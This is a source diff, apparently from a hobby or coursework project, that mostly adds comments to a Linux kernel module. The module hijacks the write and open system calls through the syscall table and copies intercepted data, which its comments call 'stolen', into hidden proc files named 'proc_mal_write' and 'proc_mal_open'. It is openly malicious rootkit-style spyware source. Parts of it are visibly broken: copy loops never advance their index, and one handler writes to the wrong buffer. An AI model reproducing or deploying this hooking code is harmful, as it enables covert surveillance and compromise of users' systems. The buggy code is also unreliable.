@@ -35,13 +35,17 @@ asmlinkage int (*old_write)(int fildes, const void *buf, size_t nbytes);
 asmlinkage int (*old_open)(const char *filename, int flags, int mode);
 
 //Proc File variables
+//Proc names
 const char proc_file_write[] = "proc_mal_write";
 const char proc_file_open[] = "proc_mal_open";
+//Buffer and the size of buffer for write.  This is put into the proc file
 char proc_buffer_write[1000];
 int proc_buffer_size_write = 0;
+//Buffer and the size of buffer for open.  This is put into the proc file
 char proc_buffer_open[1000];
 int proc_buffer_size_open = 0;
 
+//This will be called when they try to call the write proc file.
 static ssize_t proc_read_write(struct file *fp, char *buf, size_t len, loff_t * off)
 {
   //Stops the user from asking for information for forever.
@@ -51,11 +55,12 @@ static ssize_t proc_read_write(struct file *fp, char *buf, size_t len, loff_t * 
     return 0;
   }
   finished = 1;
-		memcpy(buf, proc_buffer_write, proc_buffer_size_write);
-
+  //Copies the input data into the buffer for this function.
+	memcpy(buf, proc_buffer_write, proc_buffer_size_write);
+  //Return size of data
 	return proc_buffer_size_write;
 }
-
+//This will be called when they try to call the open proc file.
 static ssize_t proc_read_open(struct file *fp, char *buf, size_t len, loff_t * off)
 {
   //Stops the user from asking for information for forever.
@@ -65,16 +70,22 @@ static ssize_t proc_read_open(struct file *fp, char *buf, size_t len, loff_t * o
     return 0;
   }
   finished = 1;
-		memcpy(buf, proc_buffer_open, proc_buffer_size_open);
 
+  //Copies the input data into the buffer for this function.
+	memcpy(buf, proc_buffer_open, proc_buffer_size_open);
+  //Return size of data
 	return proc_buffer_size_open;
 }
 
+//Struct which is refrenced when proc is read (write)
+//This then forwards to another pointer.
 static struct file_operations proc_fops_write = {
   .owner= THIS_MODULE,
   .read= proc_read_write
 };
 
+//Struct which is refrenced when proc is read (open)
+//This then forwards to another pointer.
 static struct file_operations proc_fops_open = {
   .owner= THIS_MODULE,
   .read= proc_read_open
@@ -90,11 +101,14 @@ static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
         }
 
         buffer[nbytes-1] = '\0';
+        //Take info into proc file
         proc_buffer_size_write = 0;
         int i = 0;
+        //Go through the stolen data and compy it into proc buffer
         while (buffer[i] != '\0' && i <1000){
           proc_buffer_write[i] = buffer[i];
         }
+        //Add the stolen Destination to the end
         if(i<1000){
           proc_buffer_open[i+1] = steal_dest;
         }
@@ -117,12 +131,14 @@ static unsigned long new_open(const char *filename, int flags, int mode)
         }
 
         buffer[99] = '\0';
+        //Take info into proc file
         proc_buffer_size_open = 0;
         int i = 0;
+        //Go through the stolen data and compy it into proc buffer
         while (buffer[i] != '\0' && i <1000){
           proc_buffer_open[i] = buffer[i];
-
         }
+        //Add the stolen flags to the end
         if(i<1000){
           proc_buffer_open[i+1] = steal_flags;
         }
@@ -139,7 +155,6 @@ static int is_syscall_table(ulong *p)
 }
 
 static int page_read_write(ulong address)
-
 {
         uint level;
         pte_t *pte = lookup_address(address, &level);
@@ -152,7 +167,6 @@ static int page_read_write(ulong address)
 
 
 static int page_read_only(ulong address)
-
 {
         uint level;
         pte_t *pte = lookup_address(address, &level);
@@ -160,10 +174,7 @@ static int page_read_only(ulong address)
         return 0;
 }
 
-
-
 static void replace_syscall_write(ulong offset, ulong func_address)
-
 {
         syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
 
@@ -212,7 +223,7 @@ static void cleanup_syscall(void)
         page_read_write((ulong)syscall_table);
         syscall_table[SYSCALL_NI] = (ulong)original_write;
 	page_read_only((ulong)syscall_table);
-	
+
 	page_read_write((ulong)syscall_table);
 	syscall_table[SYSCALL_NA] = (ulong)original_open;
         page_read_only((ulong)syscall_table);
